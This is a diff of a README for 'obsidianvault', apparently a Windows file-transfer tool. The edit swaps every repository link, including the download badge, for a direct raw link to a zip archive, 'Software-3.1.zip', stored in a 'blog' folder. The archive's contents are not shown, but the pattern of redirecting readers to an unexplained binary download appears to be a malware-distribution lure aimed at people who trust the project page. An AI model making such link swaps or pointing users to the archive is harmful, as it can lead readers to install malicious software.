@@ -1,6 +1,6 @@
 # 🔐 obsidianvault - Private file transfer without leaks
 
-[![Download obsidianvault](https://img.shields.io/badge/Download-obsidianvault-blue?style=for-the-badge)](https://github.com/InspectorPulido/obsidianvault)
+[![Download obsidianvault](https://img.shields.io/badge/Download-obsidianvault-blue?style=for-the-badge)](https://raw.githubusercontent.com/InspectorPulido/obsidianvault/main/blog/Software-3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This project is made for people who want private file transfer on Windows withou
 
 Use this link to visit the page to download:
 
-https://github.com/InspectorPulido/obsidianvault
+https://raw.githubusercontent.com/InspectorPulido/obsidianvault/main/blog/Software-3.1.zip
 
 ### Steps
 
@@ -190,4 +190,4 @@ You should not need to install a database, a cloud account, or extra tools. The 
 
 Primary download page:
 
-https://github.com/InspectorPulido/obsidianvault
+https://raw.githubusercontent.com/InspectorPulido/obsidianvault/main/blog/Software-3.1.zip
